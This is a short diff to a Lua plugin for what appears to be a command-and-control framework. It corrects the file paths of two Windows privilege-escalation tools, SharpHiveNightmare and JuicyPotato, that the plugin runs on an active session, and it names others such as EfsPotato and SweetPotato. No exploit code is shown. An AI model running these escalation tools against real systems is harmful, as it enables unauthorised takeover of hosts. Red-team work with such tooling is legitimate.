@@ -59,7 +59,7 @@ command("elevate:EfsPotato_Net4.0_Command", run_EfsPotato_Net40_Command,
 -- SharpHiveNightmare_Net4.exe
 local function run_SharpHiveNightmare_Net40()
     local session = active()
-    local sharphivenightmare_path = "Elevate/SharpHiveNightmare_Net4.0.exe"
+    local sharphivenightmare_path = "Elevate/SharpHiveNightmare_Net4.exe"
     return execute_assembly(session, script_resource(sharphivenightmare_path),
                             {}, true, new_sac())
 end
@@ -155,7 +155,7 @@ cmd_SweetPotato_CS:Flags():String("shellcode_file", "",
 local function run_JuicyPotato(args)
     local session = active()
     local arch = session.Os.Arch
-    local juicypotato_path = "Elevate/JuicyPotato_Net2.0.exe"
+    local juicypotato_path = "Elevate/JuicyPotato.exe"
     return execute_exe(session, script_resource(juicypotato_path), args, true,
                        6, arch, "", new_sac())
 end
